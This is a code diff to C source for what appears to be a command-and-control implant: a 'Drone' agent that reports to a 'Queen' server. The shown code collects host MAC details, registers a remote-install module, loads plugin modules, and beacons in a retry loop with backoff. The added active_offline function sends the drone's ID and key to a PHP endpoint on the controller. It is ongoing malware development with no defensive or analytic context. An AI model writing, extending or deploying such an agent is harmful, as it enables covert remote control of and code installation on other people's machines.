@@ -42,7 +42,7 @@ int create_get_string(char * buff,int flag){
     //get host MAC addr
 	#define MAXINTERFACES 16  
     int fd, interface;  
-    struct ifreq buf[MAXINTERFACES];  
+    struct ifreq buf[MAXINTERFACES]; 
     struct ifconf ifc;   
     char name[100] = {0}; 
     if((fd = socket(AF_INET, SOCK_DGRAM, 0)) >= 0)  
@@ -124,14 +124,30 @@ int exec(void **);
 void * init(void **buff)
 {    
     * buff = (void *) &exec;    
-	DroneModuleList = malloc(DroneModuleListBuffSize);
+	DroneModuleList = malloc(DroneModuleListBuffSize + sizeof(MODULE_LIST));
 	if (DroneModuleList){
-		memset (DroneModuleList,0x00,DroneModuleListBuffSize);
+		memset (DroneModuleList,0x00,DroneModuleListBuffSize + sizeof(MODULE_LIST));
         return DroneModuleList;
 	}
 	return (void *)-1;
 }
 
+void active_offline(uint32_t id,int32_t key){
+	char buff[100] = {0};
+	sprintf (buff,"%s""active_off.php?id=%d&uniqu=%d",QueenHostDir,id,key);	
+    debug_msg ("\n active off : %s \n",buff);
+
+	HYP_CONN_QUEEN_SOCKET send_hcqs;
+	if (0 == hyp_conn_queen_init(buff,0,0,&send_hcqs,1,0)){ //强制设置 QueenSSL_nonBlock 为0, 即阻塞模式
+		int i = 1;
+		do{
+			i = hyp_conn_queen_read(&send_hcqs,(char *)&buff,100,0); //强制设置 QueenSSL_nonBlock 为0, 即阻塞模式	
+			//debug_msg ("\n active off hyp_conn_queen_read : %d \n",i);
+		}while (i > 0);
+		hyp_conn_queen_close(&send_hcqs);
+	}    
+    return;
+}
 
 int exec(void ** argv)//main()
 {
@@ -169,7 +185,7 @@ int exec(void ** argv)//main()
 	while (0 == key){
 		srand( (unsigned)time( NULL ) );
 		key = rand()%2147483647;
-		
+
 		sem_id = semget(key,1,IPC_CREAT | IPC_EXCL | 0600);
 
 		if (-1 == sem_id){
@@ -207,15 +223,14 @@ int exec(void ** argv)//main()
         //memset (DroneModuleList,0x00,DroneModuleListBuffSize);
 		memset (buff,0x00,DroneSubmitBuffSize);
 		create_get_string(buff,key);
-   
-        uint32_t drone[4] = {0x0302010F,0x07060504,0x0B0A0908,0x0F0E0D0C}; //mod main (sys mid)
-		mod_insert_list(DroneModuleList,(uint32_t *)&drone,&mod_drone,0);
+        uint32_t drone[4] = {0x0302010F,0x07060504,0x0B0A0908,0x100E0D0C}; //mod main (sys mid)
+		mod_insert_list(DroneModuleList,(uint32_t *)&drone,&mod_drone,0,0);
 
         uint32_t mid[4] = {256,0,0,0}; //mod remote install (sys mid)
-		mod_insert_list(DroneModuleList,(uint32_t *)&mid,&mod_remote_install,0);
+		mod_insert_list(DroneModuleList,(uint32_t *)&mid,&mod_remote_install,0,0);
 
 		#ifdef DEBUG //add mod : test.so
-            if (0 != mod_loc_loader("./test.so")){
+            if (0 != mod_loc_loader("./test.so",0)){
 			    debug_msg ("* fail to load test MOD \n");    
 			}else{
 			    debug_msg ("success to load test MOD \n");
@@ -226,6 +241,7 @@ int exec(void ** argv)//main()
 
 		while (1){			
 			lpQueenSin = 0;
+			lpQueenPpe = 0;
 
 			//mod_loader (DroneModuleList);
 			get_string_mod (lpMod,DroneModuleList);
@@ -248,14 +264,17 @@ int exec(void ** argv)//main()
 				break;
             case -2:
             case -4:
-                if (CurrentDelay < DroneMaxDelay){
-					CurrentDelay *= 2;
-				}else{
-					CurrentDelay = DroneMaxDelay;
-				}
-				break;
 			default:
-			    CurrentDelay = 0;
+				if (0 == CurrentDelay){
+				    CurrentDelay = 1;
+				}else{
+					if (CurrentDelay < DroneMaxDelay){
+						CurrentDelay *= 2;
+					}else{
+						CurrentDelay = DroneMaxDelay;
+					}
+				}
+			    
 			    break;
 			}
 			debug_msg ("\nDroneStatus: %i , start to sleep (sec): %i \n",DroneStatus,CurrentDelay);
@@ -269,7 +288,10 @@ int exec(void ** argv)//main()
 
     if ((newDroneModuleList) && (newDroneExec)){ //copy DroneModuleList to new Drone's        
 		InheritModuleList(newDroneModuleList,DroneModuleList);
-    }	
+    }else{                                       //release all MODs
+		debug_msg ("\n mod close ...start...\n");
+	    mod_close(DroneModuleList);
+	}
 
 	if (NULL != DroneModuleList){
 		free(DroneModuleList);
@@ -277,6 +299,10 @@ int exec(void ** argv)//main()
 
 	union semun sem_union;
 	semctl(sem_id, 0, IPC_RMID, sem_union);
+
+    //notify Queen that current Drone offline
+    active_offline(DroneID,key);
+    debug_msg ("\n active off Finished\n");
 
 	#ifdef QueenSSL
 		ERR_free_strings();
@@ -287,6 +313,5 @@ int exec(void ** argv)//main()
 		exec = newDroneExec;
 		exec(argv);
     }
-	
 	return 0;
 }
